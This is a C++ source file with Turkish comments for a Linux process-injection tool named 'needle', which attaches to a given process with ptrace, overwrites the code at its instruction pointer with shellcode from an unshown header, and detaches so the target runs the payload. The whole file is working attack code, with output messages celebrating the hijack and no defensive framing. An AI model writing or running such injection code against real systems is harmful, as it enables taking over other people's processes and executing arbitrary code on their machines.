#include <iostream>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include "shellcode.h" // Shellcode'u buradan al

// Renkler
#define RED "\033[1;31m"
#define GREEN "\033[1;32m"
#define RESET "\033[0m"

using namespace std;

// Hedef process'in hafızasına veri yazma fonksiyonu
void inject_data(pid_t target_pid, unsigned char *src, void *dst, int len) {
    long *s = (long *)src;
    long *d = (long *)dst;

    // Veriyi 8 byte'lık (64-bit) bloklar halinde yazıyoruz
    for (int i = 0; i < len; i += 8, s++, d++) {
        if (ptrace(PTRACE_POKETEXT, target_pid, d, *s) < 0) {
            perror("PTRACE_POKETEXT");
            exit(1);
        }
    }
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        cout << "Kullanım: sudo ./needle <PID>" << endl;
        return 1;
    }

    pid_t target_pid = atoi(argv[1]);
    cout << GREEN << "[*] Hedef PID: " << target_pid << " üzerine kilitleniliyor..." << RESET << endl;

    // 1. Hedef işleme yapış (ATTACH)
    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) < 0) {
        perror(RED "[!] Hata: Process'e bağlanılamadı (Root musun?)" RESET);
        return 1;
    }
    cout << GREEN << "[+] Process yakalandı! Bekleniyor..." << RESET << endl;
    wait(NULL); // Process'in durmasını bekle

    // 2. Hedefin o anki register (yazmaç) durumunu al
    struct user_regs_struct regs;
    ptrace(PTRACE_GETREGS, target_pid, NULL, &regs);
    cout << GREEN << "[+] Registerlar okundu. RIP (Instruction Pointer): " << (void*)regs.rip << RESET << endl;

    // 3. Shellcode'u hedefin o an çalıştığı yere (RIP) enjekte et
    cout << GREEN << "[*] Shellcode enjekte ediliyor..." << RESET << endl;
    inject_data(target_pid, shellcode, (void*)regs.rip, sizeof(shellcode));

    // 4. Hedefi serbest bırak ama shellcode'u çalıştırt
    // RIP zaten shellcode'un başlangıcında olduğu için, DETACH edince oradan devam edecek.
    cout << GREEN << "[+] Enjeksiyon tamamlandı. Process serbest bırakılıyor..." << RESET << endl;
    
    // Shellcode çalışınca kontrolü ele alacak, bu yüzden process'i devam ettiriyoruz
    if (ptrace(PTRACE_DETACH, target_pid, NULL, NULL) < 0) {
        perror("PTRACE_DETACH");
        return 1;
    }

    cout << RED << "💥 BOOM! Hedef process artık bizim shellcode'umuzu çalıştırıyor." << RESET << endl;
    return 0;
}
